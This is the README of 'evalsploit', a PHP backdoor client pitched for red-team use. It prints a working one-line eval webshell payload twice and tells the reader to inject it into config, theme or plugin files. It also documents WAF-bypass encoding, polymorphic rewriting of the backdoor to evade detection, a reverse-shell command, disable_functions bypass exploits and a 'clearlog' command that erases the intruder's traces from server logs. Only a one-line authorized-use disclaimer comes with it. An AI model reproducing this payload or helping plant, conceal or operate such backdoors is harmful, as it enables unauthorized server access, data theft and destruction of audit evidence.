# evalsploit 3.1

> PHP backdoor client for red team and penetration testing.
> Works where everything else fails - no exec, no shell, no problem.

**Documentation:** [Русский](README_RU.md) | **English** | [中文](README_ZH.md)

---

## Why evalsploit

Most PHP backdoor clients assume you can run system commands. Real targets rarely cooperate - `exec()`, `system()`, `shell_exec()` and friends are often disabled via `disable_functions`. PHP hardening is common on shared hosting, managed WordPress, and security-conscious stacks.

evalsploit was built for exactly these environments. Every file operation uses PHP built-ins only: `fopen`, `fread`, `fwrite`, `DirectoryIterator`, `copy`, `unlink`, `rename`. The SQL console uses PDO. Grep and find use `RecursiveIteratorIterator`. Nothing requires a shell.

---

## Killer Features

### One-line payload, inject anywhere

```php
if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
```

One line. Drop it into any executed PHP file - a config include, a theme file, a plugin hook. Works as a standalone shell too. The trigger key `Z` and noise separator `V` are configurable per-session.

### PHP 8 compatible

Weevely uses `create_function`, which was removed in PHP 8.0. evalsploit works on PHP 5.6 through 8.x without modification.

### No exec, no shell - full file control anyway

All file operations go through PHP built-ins. Even in a hardened environment with every exec variant blocked, you get full read/write access to the filesystem, directory listing, recursive search, download, upload, edit-in-place.

### Polymorphic mutation - change keys without re-uploading

`mutate` generates a new backdoor with fresh random keys, sends PHP that rewrites the backdoor line in-place on the server, and switches the client to the new keys - all in one command. No re-upload, no manual edits.

### Chunked download for large files

Standard backdoor clients load the entire file into PHP memory (limited by `memory_limit`, typically 128 MB). evalsploit's chunked download uses `fseek`/`fread` to transfer files in 1 MB blocks across multiple requests, with a live progress bar:

```
  45.0 MB / 512.0 MB (8%)
```

Switch with `set download chunked` / `set download dl`.

### Per-request random response marker

The backdoor output is wrapped in a randomly generated marker on every request. No static string for WAF fingerprinting or log correlation. Each request looks different.

### 3 send modes, WAF bypass built-in

| Mode | How it works |
|------|-------------|
| **bypass** | Payload base64-encoded, split into two POST params (Z + noise separator V). Reassembled server-side. Breaks pattern-matching filters. |
| **classic** | Full base64 payload in param Z. |
| **simple** | Raw PHP in param Z. Useful for debugging or permissive targets. |

Auto-detection on connect: tries all modes, saves the working one.

### SQL console - MySQL and PostgreSQL, no separate plugins

`sql user:pass@host/db` - one command covers both MySQL and PostgreSQL via PDO. Interactive REPL, ASCII table output formatted server-side, `USE dbname` handled without extra round-trips. DSN auto-saved to session.

### Recursive grep and find - no exec required

```
grep -i "password" /var/www
find \.php$ /var/www/uploads
```

Both use PHP iterators internally. No `grep`, no `find` binary required.

### Cover your tracks - clearlog

```
clearlog detect                              <- find all accessible log files, show [rw]/[r-] status
clearlog all /shell.php                      <- remove lines matching pattern from every writable log
clearlog /var/log/nginx/access.log 1.2.3.4   <- single file, specific pattern
```

Pattern defaults to the URL path from your session config.

### disable_functions bypass - exploits sent as data

When even the file operations aren't enough, `exploit` sends a PHP exploit payload (stored locally in `exploits/`) directly through the backdoor's eval channel. Covers PHP 7.0 through 8.5. No file upload required - the exploit arrives as eval'd data.

### Plugins - extend without touching core

Drop a `.py` file in `evalsploit/plugins/`, use `@register("cmdname")`, and the command appears in the session on next run. No changes to core files.

### Proxy rotation with live validation

Load a list of `host:port` proxies, validate them (live GET through each), and use random or fixed proxy per session. Switch proxy mid-session without reconnecting.

---

## Install

```bash
cd evalsploit
pip install -e .
# or
pip install -r requirements.txt
```

Data (sessions, settings, useragents) lives under `data/`.

---

## Run

```bash
python -m evalsploit
# or
evalsploit
```

Startup menu: enter a **session name**, a **new URL**, or press Enter to use the last connection.

---

## Payload

Single-line, inject into any executed PHP:

```php
if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
```

After changing send mode or param names, run `gen` to get the matching payload.

---

## Send modes

| Mode | Description |
|------|-------------|
| **bypass** | Base64 payload split with separator across params Z and V. Bypasses some WAF/filters. |
| **classic** | Base64 payload in param Z. |
| **simple** | Raw PHP in param Z. No marker parsing - for debugging. |

Auto-detected on connect. Set manually: `set send bypass|classic|simple`.

---

## Commands

Paths with spaces are supported. Use ` : ` as separator for commands that take two paths (`cp`, `ren`/`mv`, `upload` with remote path).

| Command | Description |
|---------|-------------|
| **ls**, **dir** | List directory (`set ls ls` or `set ls dir`) |
| **cd**, **pwd**, **home** | Change dir / print pwd / go to `__DIR__` |
| **cat** | Print file (`set cat bcat` / `set cat cat`) |
| **cp** | Copy: `cp <from> : <to>` |
| **rm**, **del** | Delete file (confirmation if `set confirm 1`) |
| **ren**, **mv** | Rename/move: `ren <old> : <new>` |
| **download**, **get**, **dl** | Download: `download <remote>` or `download <remote> : <local>`. Supports chunked mode (`set download chunked`) for large files with progress bar. |
| **upload**, **put**, **upl** | Upload: `upload <local>` or `upload <local> : <remote>` |
| **mkdir**, **mkd**, **md** | Create directory |
| **create**, **mkf** | Create empty file |
| **touch**, **stat** | Update timestamp / file info |
| **edit** | Download -> edit locally -> upload |
| **grep** | Search file contents recursively: `grep [-i] <pattern> [path]` (PHP regex) |
| **find** | Search filenames recursively: `find <pattern> [path]` (PHP regex, case-insensitive) |
| **clearlog** | Remove matching lines from log files: `clearlog detect` / `clearlog <path> [pattern]` / `clearlog all [pattern]`; default pattern = URL path from config |
| **run** | Interactive shell (exec/shell_exec/...) - `exit` to quit |
| **php** | Interactive PHP console - send raw PHP to server |
| **exploit** | disable_functions bypass (PHP 7.0–8.5) |
| **try**, **detect** | Check available exec variants: `try run` |
| **reverse** | Reverse shell: `reverse <host>:<port>` |
| **sql** | SQL console (PDO/MySQL/PostgreSQL): `sql [user:pass@host[:port][/db]]`; DSN saved on successful connect; `exit` to quit |
| **scan** | Recursive scan, report saved to `report/` |
| **info** | Server info: PHP version, OS, user, `disable_functions`, `open_basedir` |
| **ping**, **check** | Connectivity and latency check |
| **gen**, **generate** | Show payload variants for current Z/V and send mode |
| **mutate** | Rewrite backdoor on server with new polymorphic payload; update local Z/V |
| **set** | Settings: `set <module> <value>` or `set <module> help` |
| **proxy_switch** | Switch proxy: no args (random), N (proxy #N), random |
| **config** | Show current settings |
| **sessions**, **saved** | List saved sessions |
| **save \<name\>** | Save current connection as session |
| **connect \<name\>** | Load and switch to saved session |
| **menu** | Return to startup menu (ends current session) |
| **help**, **exit** | Help / exit (both prompt for confirmation) |

---

## Session files

Stored in `data/sessions/<name>.ini`:

```ini
[SESSION]
url = https://target.com/shell.php
Z = mg1qjg
V = 3I15EA
send_mode = bypass
silent = 0
```

`save <name>` creates a session. `connect <name>` loads it. `silent` is stored per-session.

---

## Silent mode

`set silent 1` - on connect, skip the initial `pwd` request and send-mode detection. First command is the first request. Useful for minimal traffic footprint.

Stored globally and per-session.

---

## Proxies

Startup menu -> **5. Proxies**: load list from file (`data/proxies.txt`, one `host:port` per line), validate (live GET through each), enable random or fixed mode.

In-session:
- `set proxy 0` / `set proxy 1` - disable/enable
- `set proxy show` - list validated proxies, choose by number
- `set proxy switch` - pick another random proxy
- `set proxy switch N` - switch to proxy #N
- `proxy_switch` - alias

---

## Settings (set)

| Setting | Values |
|---------|--------|
| `set send` | `bypass`, `classic`, `simple` |
| `set run` | `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `expect_popen`, `pcntl_exec`, `do` |
| `set ls` / `set cat` | snippet key (see `snippets.ini`) |
| `set download` | `dl` (default), `chunked` (large files, progress bar) |
| `set silent` | `0`, `1` |
| `set confirm` | `0`, `1` - prompt before rm/upload/edit |
| `set reverse` | `ivan`, `monkey` |
| `set grep` / `set find` | snippet key |
| `set rm`, `set upload`, `set rename`, `set stat`, `set touch`, `set create`, `set mkdir`, `set cp` | snippet key (aliases accepted) |

`set <setting> help` lists available values. SQL DSN is saved automatically on successful connect.

---

## Snippets

File commands use PHP snippets from `evalsploit/modules/snippets/`, indexed in `snippets.ini`. Switch variant with `set <command> <key>`. Invalid keys are reset on load with a warning.

Notable snippet variants:
- `set download chunked` - chunked 1 MB/request download with progress, no PHP memory limit
- `set ls dir` - Windows-style directory listing
- `set cat bcat` - binary-safe file read

---

## Mutation

`mutate` generates a new polymorphic backdoor (new Z, V), sends PHP that locates the line with `isset($_POST['Z'])` in the target file, replaces it with the new backdoor, and writes the file. The client updates its keys. Other backdoor instances keep their old keys.

---

## Plugins

Drop a `.py` file in `evalsploit/plugins/`. Files starting with `_` are skipped.

Minimal example (`evalsploit/plugins/mycmd.py`):

```python
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

@register("mycmd", description="Short description", usage="mycmd [path]")
class MyCmdModule(Module):
    def run(self, ctx, args):
        print(ctx.send("echo getcwd();").strip())
        return None
```

`ctx.send(php)` - send PHP to server and get output.
`ctx.resolve_path(path)` - resolve path relative to current pwd.
`php_quote(s)` - escape and quote a string for PHP single-quoted literal.
`confirm_dangerous(ctx, action, detail)` - prompt before destructive ops.

See `evalsploit/plugins/README.md` and `example_cwd.py` for more.

---

## Architecture

```
evalsploit/
├── cli.py              - startup menu, session loop, help
├── config.py           - settings, session load/save, snippet key validation
├── context.py          - SessionContext: url, pwd, send(), path helpers
├── transport/
│   ├── send.py         - HTTP POST, payload encoding, response marker parsing
│   └── payloads.py     - polymorphic backdoor generation, mutation PHP
├── modules/
│   ├── registry.py     - @register decorator, COMMANDS/COMMAND_HELP dicts
│   ├── base.py         - Module base class, snippet loader, php_quote, substitute
│   ├── snippets/       - PHP templates (ls, cat, dl, grep, find, sql, ...)
│   └── file/ set/ ...  - command modules
└── plugins/            - user plugins (auto-loaded at startup)
exploits/               - PHP disable_functions bypass payloads (sent as eval data)
data/                   - settings.ini, sessions/, proxies.txt, downloads/
```

---

## Comparison with alternatives

### Feature matrix

| Feature | evalsploit | Weevely 3 | PhpSploit |
|---------|------------|-----------|-----------|
| PHP 8 compatible | **yes** | no (`create_function` removed) | yes |
| No exec/shell required | **yes** (PHP built-ins only) | partial | partial |
| Per-request random marker | **yes** | no (static MD5 marker) | no |
| Polymorphic mutation | **yes** (server-side rewrite) | no | no |
| Silent mode | **yes** | no | no |
| 3 send modes (bypass/classic/simple) | **yes** | no | no |
| SQL console | **yes** (PDO, MySQL+PostgreSQL) | yes (mysqli/pg_*) | yes (separate plugin per DBMS) |
| Recursive grep/find without exec | **yes** | partial | no |
| Chunked download (large files) | **yes** (1 MB/request, progress) | no | no |
| Cover tracks (clearlog) | **yes** (plugin) | yes | yes |
| disable_functions bypass | **yes** (PHP 7.0–8.5) | yes | yes |
| Plugins | **yes** (single .py file) | yes | yes |

### Weevely

Weevely uses XOR+gzip+base64 transport with static per-deployment MD5-derived markers, making every deployment identifiable. It relies on `create_function` for obfuscation - removed in PHP 8.0. evalsploit uses a random marker per request, works on PHP 5.6–8.x, and needs no exec for file operations.

### PhpSploit

PhpSploit is a full C2 framework with header-based tunneling, plugin system, and separate SQL modules per DBMS. evalsploit covers MySQL and PostgreSQL in a single `sql` command via PDO. Sessions are plain `.ini` files. Silent mode and polymorphic mutation have no equivalent in PhpSploit.

---

## License / use

For authorized security testing and research only.
